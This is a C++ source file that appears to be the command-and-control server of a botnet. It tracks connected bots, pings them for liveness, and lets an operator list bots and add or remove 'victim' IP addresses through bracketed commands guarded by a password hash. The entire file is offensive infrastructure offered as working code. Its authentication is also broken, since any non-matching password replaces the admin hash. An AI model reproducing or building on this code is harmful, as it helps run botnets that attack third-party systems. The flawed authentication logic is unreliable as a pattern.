#include "server.h"

#ifdef NDEBUG
#define PRINT(a, b)
#else
#define PRINT(a, b) std::cout << "[DEBUG]: " << (a) << (b) << std::endl;
#endif

server::server(io::io_context& io_context, std::uint16_t port)
    : io_context_(io_context), acceptor_(io_context, tcp::endpoint(tcp::v4(), port)) {
	command_handlers_ = {
	    {"[ARE_YOU_ALIVE]",
	     boost::bind(&server::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[INIT]",
	     boost::bind(&server::initManager, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[GET_BOTS]",
	     boost::bind(&server::getClients, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[GET_IPS]",
	     boost::bind(&server::getVictims, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[ADD_IP]",
	     boost::bind(&server::addVictim, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[DEL_BOT]",
	     boost::bind(&server::removeClient, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[DEL_IP]",
	     boost::bind(&server::removeVictim, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	};
}

void server::start() {
	routine_future_ = std::async(std::launch::async, &server::pingClients,
				     this);  // TODO: substitude this by boost::asio internal timeout clock
	accept();
}

void server::accept() {
	socket_.emplace(io_context_);
	acceptor_.async_accept(*socket_, [self = this](err error_code) { self->onAccept(error_code); });
}

void server::onAccept(err error_code) {
	size_t client_id = getClientId_();
	clients_sessions_container_.insert(
	    std::make_pair(client_id, std::make_shared<session>(std::move(*socket_), io_context_, client_id)));
	auto& client = clients_sessions_container_.find(client_id)->second;

	// client->send("SUCCESS\n");
	PRINT("New client connected", "");

	client->start(boost::bind(&server::handleResponse, this, boost::placeholders::_1, boost::placeholders::_2));
	accept();
}

void server::handleResponse(std::string& query, session* client) {
	PRINT(client->endpoint_, (": " + query));

	auto parsed_msg = msg_parser_.parse_msg(query);

	if (parsed_msg["is_valid_msg"][0] == "false") {
		PRINT("Invalid message", "");
		return;
	}
	if (command_handlers_.find(parsed_msg["command"][0]) == command_handlers_.end()) {
		PRINT("No handler for ", parsed_msg["command"][0]);
		return;
	};

	auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
	if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], client);
}

void server::handleAlive(std::string& command, std::vector<std::string>& params, session* client) {
	if (!params.size()) return;
	if (!isNumber_(params[0])) return;
	if (stoi(params[0])) client->inactive_timeout_count_ = 0;
}

void server::initManager(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.size()) {
		if (!checkHash_(params[0])) {
			PRINT(command, " Success.");
			std::hash<std::string> hasher;
			admin_hash_ = hasher(params[0]);
		}
	}

	std::vector<std::string> output_params = {"1"};
	client->send(msg_parser_.genCommand(command, output_params));
}

void server::getClients(std::string& command, std::vector<std::string>& params, session* client) {
	if (!params.size()) return;
	if (!checkHash_(params[0])) return;

	std::vector<std::string> output_params;
	{
		std::unique_lock<std::mutex> lock(clients_m_);
		for (auto const& [key, val] : clients_sessions_container_) {
			std::stringstream ip;
			ip << val->endpoint_;
			output_params.push_back(ip.str());
		}
	}
	client->send(msg_parser_.genCommand(command, output_params));
}

void server::getVictims(std::string& command, std::vector<std::string>& params, session* client) {
	if (!params.size()) return;
	if (!checkHash_(params[0])) return;

	std::vector<std::string> output_params;
	{
		std::unique_lock<std::mutex> lock(victims_m_);
		for (auto ip : victims_ips_) {
			output_params.push_back(ip);
		}
	}
	client->send(msg_parser_.genCommand(command, output_params));
}

void server::addVictim(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.size() < 2) return;
	if (!checkHash_(params[0])) return;
	std::unique_lock<std::mutex> lock(victims_m_);
	victims_ips_.push_back(params[1]);
}

void server::removeClient(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.size() < 2) return;
	if (!checkHash_(params[0])) return;
	std::shared_ptr<session> bot;
	size_t bot_id;
	{
		std::unique_lock<std::mutex> lock(clients_m_);	// TODO: create second hash map with ip addresses
		for (auto const& [key, val] : clients_sessions_container_) {
			std::stringstream ip;
			ip << val->endpoint_;
			if (params[1] == ip.str()) {
				bot_id = key;
				bot = val;
				break;
			}
		}
	}
	bot->stop();
	{
		std::unique_lock<std::mutex> lock(clients_m_);
		clients_sessions_container_.erase(bot_id);
	}
}

void server::removeVictim(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.size() < 2) return;
	if (!checkHash_(params[0])) return;

	std::unique_lock<std::mutex> lock(victims_m_);
	auto index = find(victims_ips_.begin(), victims_ips_.end(), params[1]);
	if (index == victims_ips_.end()) return;
	victims_ips_.erase(std::remove(victims_ips_.begin(), victims_ips_.end(), params[1]), victims_ips_.end());
}

void server::pingClients() {
	while (true) {
		usleep(INACTIVITY_TIMEOUT);

		std::vector<size_t> inactive_clients;

		for (auto& client : clients_sessions_container_) {
			client.second->inactive_timeout_count_++;

			if (client.second->inactive_timeout_count_ >= 3) {
				client.second->send("Disconecting due to inactivity\n");
				std::cout << "Disconecting " << client.second->endpoint_ << " due to inactivity" << std::endl;

				inactive_clients.push_back(client.second->id_);
				client.second->stop();
			} else {
				client.second->send(":msg [ARE_YOU_ALIVE]\n");
			}
		}
		{
			std::unique_lock<std::mutex> lock(clients_m_);
			for (auto& client_id : inactive_clients) {
				PRINT("ERASING ", client_id);
				clients_sessions_container_.erase(client_id);
			}
		}
	}
}

void server::sendAllClients(std::string const& msg) {
	for (auto& pair : clients_sessions_container_) {
		pair.second->send(msg);
	}
}

size_t server::getClientId_() {
	std::hash<long int> hasher;
	size_t id = hasher(
	    std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count());
	PRINT("Created hash", id);
	return id;
}

bool server::checkHash_(std::string& pass) {
	if (pass == "") return false;
	std::hash<std::string> hasher;
	return hasher(pass) == admin_hash_;
}

bool server::isNumber_(const std::string& s) { return !s.empty() && std::all_of(s.begin(), s.end(), ::isdigit); }